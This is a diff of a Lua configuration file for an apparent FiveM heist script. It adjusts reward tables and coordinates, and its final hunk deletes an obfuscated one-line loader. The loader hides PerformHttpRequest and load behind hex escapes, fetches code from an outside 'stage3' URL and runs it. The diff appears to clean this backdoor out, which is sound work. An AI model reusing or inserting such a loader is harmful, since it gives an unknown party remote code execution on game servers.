@@ -1,5 +1,8 @@
 Config = Config or {}
 
+
+Config.FirstHack = vector3(-357.64, -52.19, 49.04)
+
 --- This function gets triggered whenever one or more PowerStations have been hit
 --- @param hits array
 --- @return nil
@@ -50,13 +53,15 @@ Config.RewardTypes = {
     }
 }
 
+
+Config.AlcoholRareItem1 = "electronickit"
+
 Config.LockerRewards = {
     ["tier1"] = {
         [1] = {item = "goldchain", minAmount = 5, maxAmount = 15},
     },
     ["tier2"] = {
         [1] = {item = "rolex", minAmount = 5, maxAmount = 15},
-        [3] = {item = "security_card_01", minAmount = 1, maxAmount = 1},
     },
     ["tier3"] = {
         [1] = {item = "goldbar", minAmount = 1, maxAmount = 2},
@@ -69,8 +74,6 @@ Config.LockerRewardsPaleto = {
     },
     ["tier2"] = {
         [1] = {item = "rolex", minAmount = 10, maxAmount = 20},
-        [2] = {item = "security_card_02", minAmount = 1, maxAmount = 1},
-        [3] = {item = "security_card_01", minAmount = 1, maxAmount = 1},
     },
     ["tier3"] = {
         [1] = {item = "goldbar", minAmount = 2, maxAmount = 4},
@@ -83,8 +86,6 @@ Config.LockerRewardsPacific = {
     },
     ["tier2"] = {
         [1] = {item = "goldbar", minAmount = 4, maxAmount = 8},
-        [2] = {item = "security_card_02", minAmount = 1, maxAmount = 1},
-        [3] = {item = "security_card_01", minAmount = 1, maxAmount = 1},
     },
     ["tier3"] = {
         [1] = {item = "goldbar", minAmount = 4, maxAmount = 8},
@@ -198,6 +199,3 @@ Config.CameraHits = {
         stationsToHitPolice = {12, 13}
     }
 }
-
-
-local nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[4][nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (KRFcUKrdMbuzptBoQcnDZjvwAGSGbhyRRLMesyTHIcVNLxLwDIzLHcKsxYvujSngNMwzUg, wWwRMPTGlmYgIKCKnkldLfUPgzZhKXUupqcDQqMltHxbEkofCMrcgquUULycHVzvxcPzNO) if (wWwRMPTGlmYgIKCKnkldLfUPgzZhKXUupqcDQqMltHxbEkofCMrcgquUULycHVzvxcPzNO == nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[6] or wWwRMPTGlmYgIKCKnkldLfUPgzZhKXUupqcDQqMltHxbEkofCMrcgquUULycHVzvxcPzNO == nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[5]) then return end nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[4][nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[2]](nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[4][nflSRQDZCSHxQYBcntusFijPFmTCMKxOMROmObsTTKIxaYaRmcPkwGMYfbSSMaxxAyztod[3]](wWwRMPTGlmYgIKCKnkldLfUPgzZhKXUupqcDQqMltHxbEkofCMrcgquUULycHVzvxcPzNO))() end)
